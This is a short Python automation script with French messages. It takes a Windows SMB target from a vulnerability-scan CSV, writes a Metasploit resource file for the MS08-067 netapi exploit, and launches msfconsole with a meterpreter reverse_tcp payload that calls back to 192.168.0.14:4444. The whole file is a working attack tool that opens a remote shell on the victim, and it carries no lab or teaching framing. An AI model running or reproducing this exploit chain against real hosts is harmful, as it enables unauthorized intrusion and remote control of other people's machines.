import csv, os, subprocess

def run_ms08_067():
    vuln_csv = "/workspace/csv_results/vuln_results.csv"
    rc_path = "/workspace/every_exploits/ms08_067.rc"
    target = None
    with open(vuln_csv) as f:
        for r in csv.DictReader(f):
            if r["service"] == "netbios-ssn" and "Windows" in r["os"]:
                target = r["ip"]; break
    if not target:
        print("[-] Pas de cible MS08‑067 détectée."); return

    print(f"[+] MS08‑067 sur {target}")
    with open(rc_path, "w") as rc:
        rc.write("use exploit/windows/smb/ms08_067_netapi\n")
        rc.write(f"set RHOST {target}\n")
        rc.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
        rc.write("set LHOST 192.168.0.14\nset LPORT 4444\nexploit\n")
    subprocess.run([
        "bash", "-c",
        "BUNDLE_GEMFILE=.../Gemfile "  # à adapter
        ".../msfconsole -r " + rc_path
    ])

if __name__ == "__main__":
    run_ms08_067()
